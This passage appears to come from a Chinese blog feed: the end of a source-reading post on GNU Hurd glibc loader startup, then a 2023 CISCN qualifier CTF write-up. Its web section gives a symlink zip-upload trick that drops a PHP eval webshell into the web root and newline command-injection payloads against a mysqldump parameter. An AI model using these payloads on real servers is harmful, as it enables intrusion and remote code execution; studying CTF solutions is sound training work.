class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c">Elf64_Addr _dl_sysdep_start (<span class="hljs-type">void</span> **start_argptr,<br>  <span class="hljs-type">void</span> (*dl_main) (<span class="hljs-type">const</span> ElfW(Phdr) *phdr, ElfW(Word) phent,<br>   ElfW(Addr) *user_entry,<br>   ElfW(<span class="hljs-type">auxv_t</span>) *auxv))<br>&#123;<br>  <span class="hljs-type">void</span> <span class="hljs-title function_">go</span> <span class="hljs-params">(<span class="hljs-type">intptr_t</span> *argdata)</span><br>    &#123;<br>      <span class="hljs-type">char</span> *orig_argv0;<br>      <span class="hljs-type">char</span> **p;<br><br>      _dl_argc = *argdata;<br>      _dl_argv = <span class="hljs-number">1</span> + (<span class="hljs-type">char</span> **) argdata;<br>      _environ = &amp;_dl_argv[_dl_argc + <span class="hljs-number">1</span>];<br>      <span class="hljs-keyword">for</span> (p = _environ; *p++;); <br><br>      orig_argv0 = _dl_argv[<span class="hljs-number">0</span>];<br><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">void</span> *) p == _dl_argv[<span class="hljs-number">0</span>])<br>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hurd_startup_data</span> <span class="hljs-title">nodata</span>;</span><br>  _dl_hurd_data = &amp;nodata;<br>  nodata.user_entry = (<span class="hljs-type">vm_address_t</span>) ENTRY_POINT;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>_dl_hurd_data = (<span class="hljs-type">void</span> *) p;<br><br>      GLRO(dl_platform) = <span class="hljs-literal">NULL</span>; <br><br>      __libc_enable_secure = _dl_hurd_data-&gt;flags &amp; EXEC_SECURE;<br><br>      __tunables_init (_environ); <br>      _dl_sort_maps_init ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DL_SYSDEP_INIT</span><br>      DL_SYSDEP_INIT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DL_PLATFORM_INIT</span><br>      DL_PLATFORM_INIT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Determine the length of the platform name.  */</span><br>      <span class="hljs-keyword">if</span> (GLRO(dl_platform) != <span class="hljs-literal">NULL</span>)<br>GLRO(dl_platformlen) = <span class="hljs-built_in">strlen</span> (GLRO(dl_platform));<br><br>      <span class="hljs-keyword">if</span> (_dl_hurd_data-&gt;flags &amp; EXEC_STACK_ARGS<br>  &amp;&amp; _dl_hurd_data-&gt;user_entry == <span class="hljs-number">0</span>)<br>_dl_hurd_data-&gt;user_entry = (<span class="hljs-type">vm_address_t</span>) ENTRY_POINT;<br><br>      (*dl_main) ((<span class="hljs-type">const</span> ElfW(Phdr) *) _dl_hurd_data-&gt;phdr,<br>  _dl_hurd_data-&gt;phdrsz / <span class="hljs-keyword">sizeof</span> (ElfW(Phdr)),<br>  (ElfW(Addr) *) &amp;_dl_hurd_data-&gt;user_entry, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-type">char</span> **newp;<br>      <span class="hljs-keyword">for</span> (newp = _environ; *newp++;);<br><br>      <span class="hljs-keyword">if</span> (newp != p || _dl_argv[<span class="hljs-number">0</span>] != orig_argv0)<br>&#123; <br>  <span class="hljs-keyword">if</span> (orig_argv0 == (<span class="hljs-type">char</span> *) p)<br>    &#123;<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span> *) newp != _dl_argv[<span class="hljs-number">0</span>])<br>&#123;<br>  assert ((<span class="hljs-type">char</span> *) newp &lt; _dl_argv[<span class="hljs-number">0</span>]);<br>  _dl_argv[<span class="hljs-number">0</span>] = memmove ((<span class="hljs-type">char</span> *) newp, _dl_argv[<span class="hljs-number">0</span>],<br> <span class="hljs-built_in">strlen</span> (_dl_argv[<span class="hljs-number">0</span>]) + <span class="hljs-number">1</span>);<br>&#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">void</span> *) newp != _dl_hurd_data)<br>memmove (newp, _dl_hurd_data, <span class="hljs-keyword">sizeof</span> (*_dl_hurd_data));<br>    &#125;<br>&#125;<br><br>      &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> _dl_start_user (<span class="hljs-type">void</span>);<br>RETURN_TO (argdata, &amp;_dl_start_user, _dl_hurd_data-&gt;user_entry);<br>      &#125;<br>    &#125;<br><br>  __mach_init (); <br><br>  _dl_pagesize = __getpagesize ();<br><br>  _hurd_startup (start_argptr, &amp;go);<br><br>  LOSE;<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="hurd-startup">_hurd_startup</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_hurd_startup (<span class="hljs-type">void</span> **argptr, <span class="hljs-type">void</span> (*main) (<span class="hljs-type">intptr_t</span> *data))<br>&#123;<br>  <span class="hljs-type">error_t</span> err;<br>  <span class="hljs-type">mach_port_t</span> in_bootstrap;<br>  <span class="hljs-type">char</span> *args, *env;<br>  <span class="hljs-type">mach_msg_type_number_t</span> argslen, envlen;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hurd_startup_data</span> <span class="hljs-title">data</span>;</span><br>  <span class="hljs-type">char</span> **argv, **envp;<br>  <span class="hljs-type">int</span> argc, envc;<br>  <span class="hljs-type">intptr_t</span> *argcptr;<br>  <span class="hljs-type">vm_address_t</span> addr;<br><br>  addr = <span class="hljs-number">0</span>;<br>  __vm_map (__mach_task_self (),<br>    &amp;addr, __vm_page_size, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, MACH_PORT_NULL, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>    VM_PROT_NONE, VM_PROT_NONE, VM_INHERIT_COPY);<br><br>  <span class="hljs-keyword">if</span> (err = __task_get_special_port (__mach_task_self (), TASK_BOOTSTRAP_PORT,<br>     &amp;in_bootstrap))<br>    LOSE;<br><br>  <span class="hljs-keyword">if</span> (in_bootstrap != MACH_PORT_NULL)<br>    &#123;<br>      argslen = envlen = <span class="hljs-number">0</span>;<br>      data.dtablesize = data.portarraysize = data.intarraysize = <span class="hljs-number">0</span>;<br><br>      err = __exec_startup_get_info (in_bootstrap,<br>     &amp;data.user_entry,<br>     &amp;data.phdr, &amp;data.phdrsz,<br>     &amp;data.stack_base, &amp;data.stack_size,<br>     &amp;data.flags,<br>     &amp;args, &amp;argslen,<br>     &amp;env, &amp;envlen,<br>     &amp;data.dtable, &amp;data.dtablesize,<br>     &amp;data.portarray, &amp;data.portarraysize,<br>     &amp;data.intarray, &amp;data.intarraysize);<br>      __mach_port_deallocate (__mach_task_self (), in_bootstrap);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (err || in_bootstrap == MACH_PORT_NULL || (data.flags &amp; EXEC_STACK_ARGS))<br>    &#123;<br><br>      argcptr = (<span class="hljs-type">intptr_t</span> *) argptr;<br>      argc = argcptr[<span class="hljs-number">0</span>];<br>      argv = (<span class="hljs-type">char</span> **) &amp;argcptr[<span class="hljs-number">1</span>];<br>      envp = &amp;argv[argc + <span class="hljs-number">1</span>];<br>      envc = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> (envp[envc])<br>++envc;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      argc = __argz_count (args, argslen);<br>      envc = __argz_count (env, envlen);<br>      argcptr = __alloca (<span class="hljs-keyword">sizeof</span> (<span class="hljs-type">intptr_t</span>)<br>  + (argc + <span class="hljs-number">1</span> + envc + <span class="hljs-number">1</span>) * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">char</span> *)<br>  + <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> hurd_startup_data));<br>      *argcptr = argc;<br>      argv = (<span class="hljs-type">void</span> *) (argcptr + <span class="hljs-number">1</span>);<br>      __argz_extract (args, argslen, argv);<br><br>      envp = &amp;argv[argc + <span class="hljs-number">1</span>];<br>      __argz_extract (env, envlen, envp);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (err || in_bootstrap == MACH_PORT_NULL)<br>    &#123;<br>      data.flags = <span class="hljs-number">0</span>;<br>      args = env = <span class="hljs-literal">NULL</span>;<br>      argslen = envlen = <span class="hljs-number">0</span>;<br>      data.dtable = <span class="hljs-literal">NULL</span>;<br>      data.dtablesize = <span class="hljs-number">0</span>;<br>      data.portarray = <span class="hljs-literal">NULL</span>;<br>      data.portarraysize = <span class="hljs-number">0</span>;<br>      data.intarray = <span class="hljs-literal">NULL</span>;<br>      data.intarraysize = <span class="hljs-number">0</span>;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-type">void</span> *) &amp;envp[envc + <span class="hljs-number">1</span>] == argv[<span class="hljs-number">0</span>])<br>    &#123;<br>      <span class="hljs-keyword">struct</span><br>&#123;<br>  <span class="hljs-type">intptr_t</span> count;<br>  <span class="hljs-type">char</span> *argv[argc + <span class="hljs-number">1</span>];<br>  <span class="hljs-type">char</span> *envp[envc + <span class="hljs-number">1</span>];<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hurd_startup_data</span> <span class="hljs-title">data</span>;</span><br>&#125; *args = alloca (<span class="hljs-keyword">sizeof</span> *args);<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">void</span> *) &amp;args[<span class="hljs-number">1</span>] == (<span class="hljs-type">void</span> *) argcptr)<br>args = alloca (-((<span class="hljs-type">char</span> *) &amp;args-&gt;data - (<span class="hljs-type">char</span> *) args));<br>      memmove (args, argcptr, (<span class="hljs-type">char</span> *) &amp;args-&gt;data - (<span class="hljs-type">char</span> *) args);<br>      argcptr = (<span class="hljs-type">void</span> *) args;<br>      argv = args-&gt;argv;<br>      envp = args-&gt;envp;<br>    &#125;<br><br>  &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hurd_startup_data</span> *<span class="hljs-title">d</span> =</span> (<span class="hljs-type">void</span> *) &amp;envp[envc + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">void</span> *) d != argv[<span class="hljs-number">0</span>])<br>      &#123;<br>*d = data;<br>_hurd_init_dtable = d-&gt;dtable;<br>_hurd_init_dtablesize = d-&gt;dtablesize;<br>      &#125;<br>    (*main) (argcptr);<br>  &#125;<br><br>  LOSE;<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="hurd-startup概要">_hurd_startup概要</h5><p>根据代码可以看出,<code>_hurd_startup</code>函数主要是先通过<code>__exec_startup_get_info</code>接口(接口找不到实在找不到定义的位置), 提取出与程序相关的<code>hurd_startup_data</code>结构体信息，然后根据<code>argptr</code>参数提取命令行传入的参数与环境变量</p><p>那么我们可以理出在执行<code>_start</code>时栈空间中储存了<code>argc</code>,<code>args</code>,<code>envs</code>, 还储存了程序相关的信息,如:<code>入口函数地址,空间开头,程序头与程序头的数量</code></p><p>最后调用了传入的<code>_dl_sysdep_start::go</code>函数</p><h4 id="dl-sysdep-start概要">_dl_sysdep_start概要</h4><p>从代码中可以看到,这里定义了一个名为<code>go</code>的函数,并将其作为参数传入了<code>_hurd_startup</code>函数中</p><p>在知道了<code>_hurd_startup</code>中进行了哪些操作之后, 我们可以分析<code>go</code>函数了</p><p>go函数,先分析了经过<code>_hurd_startup</code>函数操作过的栈空间中储存的信息, 从中读取了<code>程序头</code>,<code>程序头数量</code>,<code>程序入口</code>,并将其传入<code>_dl_main</code>中</p><p>在从<code>_dl_main</code>返回之后,跳转到<code>_dl_start_user</code>位置</p><h2 id="本篇总结">本篇总结</h2><p>至此, 程序执行过程中已经将<code>ld.so</code>的信息初始化完成, 后面的<code>_dl_main</code>将会判断执行<code>ld.so</code>,还是<code>指定的程序</code></p>]]></content>
    
    
    <categories>
      
      <category>程序启动过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>源码阅读</tag>
      
      <tag>二进制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ciscn初赛wp</title>
    <link href="/page/wp/2023ciscn%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/page/wp/2023ciscn%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="misc">misc</h1><h2 id="签到卡">签到卡</h2><p><code>print(open('/flag').read())</code></p><p><img src="/img/blog_img/CISCN/page_Image/ffdffe97bf7f622c865051c4af9005c87b62167cdf9ddb26906302c7215458b8.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="被加密的生产流量">被加密的生产流量</h2><p>追踪tcp流，数据提取出来base32</p><p><img src="/img/blog_img/CISCN/page_Image/d10ed5dec2efee59d1703eb0acdd371985cafc0ce80a5f3372c1097d2ffe7383.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/CISCN/page_Image/25d0ddcdf78dfc2407caa2984f63055509a22fe68a93d1e1813baf0799f7755a.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="国粹">国粹</h2><p>先分割<code>题目.png</code>中的小麻将到<code>output</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;题目.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure><p>再将<code>a.png</code>和<code>k.png</code>中的小麻将去<code>output</code>找对应的索引值，分别作为纵坐标和横坐标画图得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure><h1 id="crypto">crypto</h1><h2 id="基于国密SM2算法的密钥密文分发">基于国密SM2算法的密钥密文分发</h2><p>根据文档一步一步来即可，虽然有点没看懂</p><p>先找个网址生成一组公钥和密钥 <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p><p>登录拿id</p><p><img src="/img/blog_img/CISCN/page_Image/097019e2de3c0e24a8b82073bc4d12e4532edb2c5d9bdc0b78949f4dc344464e.png" srcset="/img/loading.gif" lazyload alt=""></p><p>上传公钥</p><p><img src="/img/blog_img/CISCN/page_Image/df23bd6e9ea2da15d3ebf3cfd12d5b8b8a1ee1d4e0f5820ff19bb9cfbc433285.png" srcset="/img/loading.gif" lazyload alt=""></p><p>访问<code>/api/quantum</code>获取密钥密文</p><p>访问<code>/api/check</code>发送<code>quantumString</code>的值</p><p>使<code>quantumStringUser</code>的值等于<code>quantumStringServer</code>的值即可通过验证</p><p>访问<code>/api/search</code>得到flag</p><p><img src="/img/blog_img/CISCN/page_Image/9bc52566499d1a94271c8f21d50ebadec4503adfc966449cc0486795835b9f56.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="可信度量">可信度量</h2><p>非预期</p><p><code>/proc/22/task/22/environ</code>可以直接看到flag</p><p><img src="/img/blog_img/CISCN/page_Image/6b104e57915286602e1c61bd16bf846044a99978da02cf252338bd65530caac6.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="Sign-in-passwd">Sign_in_passwd</h2><p>base64换表</p><p><img src="/img/blog_img/CISCN/page_Image/3738283b3b0da9931287367453fe2481d4b361a998677b71850b0b3297a6b2f0.png" srcset="/img/loading.gif" lazyload alt=""></p><h1 id="web">web</h1><h2 id="unzip">unzip</h2><p>上传后返回源码</p><p>只能上传<code>zip</code>文件，上传后在<code>tmp</code>目录使用<code>unzip -o</code>解压</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">//构造一个指向/var/www/html的软连接<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//保留软连接压缩<br>zip --symlinks test.zip poc<br><br>//创建跟第一个压缩包中目录同名的目录<br><span class="hljs-built_in">mkdir</span> poc<br><br>//接着向目录中写一个shell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//压缩这个目录<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure><p>上传第一个压缩包后会在<code>tmp</code>目录下生成一个软连接到<code>/var/www/html</code>，当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p><p><img src="/img/blog_img/CISCN/page_Image/afee797b97dabfc906aaf8cc7a1b69189372fbccd7bcc64548a026f88abd237e.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="dumpit">dumpit</h2><p>根据题目描述可知分别有查询和导出的功能点</p><p>根据执行命令后的返回值推测执行的命令如下</p><p>传入<code>?db=a&amp;table_2_query=b</code>时会执行<code>select * from a.b</code><br>传入<code>?db=a&amp;table_2_dump=b</code>时会执行<code>mysqldump -u root a b &gt; log/xxx.log</code></p><p>这里因为<code>a</code>和<code>b</code>的值可控，所以相当于我们可以执行命令了</p><p>方法1：<br>直接传<code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>，然后访问<code>log/1</code></p><p>方法2：<br>因为<code>mysqldump</code>在找不到我们给出的表的情况下会抛出错误信息<code>mysqldump: Couldn't find table: &quot;表名&quot;</code></p><p>在<code>linux</code>中可以利用<code>2&gt;</code>将命令执行的结果输出到文件中</p><p>传<code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>，然后访问<code>1.php</code></p><p><img src="/img/blog_img/CISCN/page_Image/1a44d8d17e70f4d8638ee3fae6882430beb3fe6d91b89dcb53f6e6f2161241b9.png" srcset="/img/loading.gif" lazyload alt=""></p><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span 